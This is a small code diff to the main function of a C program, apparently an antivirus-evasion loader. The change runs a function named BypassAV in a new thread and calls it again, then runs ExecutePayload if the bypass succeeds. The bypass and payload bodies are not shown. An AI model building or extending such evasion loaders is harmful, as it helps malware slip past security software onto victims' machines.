@@ -9,7 +9,8 @@ void ExecutePayload();
 
 int main(int argc, char const *argv[])
 {
-	if(BypassAV()){
+	CreateThread(NULL,0,BypassAV,NULL,0,NULL);
+	if(BypassAV(NULL)){
 		ExecutePayload();	
 	}
 	return 0;
